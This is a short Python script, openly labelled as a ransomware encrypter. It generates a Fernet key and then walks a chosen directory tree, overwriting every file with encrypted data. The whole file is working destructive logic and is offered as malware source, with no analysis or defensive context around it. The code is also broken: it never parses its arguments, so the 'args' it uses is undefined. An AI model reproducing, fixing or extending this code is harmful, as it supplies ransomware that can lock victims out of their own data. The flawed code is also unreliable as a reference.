import os
import sys
import argparse
from cryptography.fernet import Fernet

def generate_key():
    key = Fernet.generate_key()
    with open("ransomware_key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    if not os.path.exists("ransomware_key.key"):
        print("Key file not found. Please generate a key first.")
        sys.exit(1)
    return open("ransomware_key.key", "rb").read()

def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = fernet.encrypt(file_data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def main():
    parser = argparse.ArgumentParser(description="Ransomware - Encrypter")
    parser.add_argument("--path", type=str, required=True, help="Path to directory or file")
    generate_key()
    key = load_key()
    for root, dirs, files in os.walk(args.path):
        for file in files:
            encrypt_file(os.path.join(root, file), key)
    print(f"Encryption complete. Save this key for decryption: {key.decode()}")

if __name__ == "__main__":
    main()
